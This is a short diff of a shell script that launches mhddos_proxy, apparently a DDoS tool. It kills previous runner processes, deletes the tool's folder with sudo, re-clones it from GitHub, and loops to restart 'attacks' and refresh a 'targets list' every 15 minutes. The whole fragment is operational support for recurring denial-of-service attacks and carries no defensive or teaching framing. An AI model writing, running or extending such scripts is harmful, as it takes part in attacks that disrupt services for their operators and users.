@@ -29,6 +29,9 @@ proxy_interval="-p $proxy_interval"
 #Just in case kill previous copy of mhddos_proxy
 pkill -f runner.py
 pkill -f ./start.py
+cd ~
+sudo rm -r mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
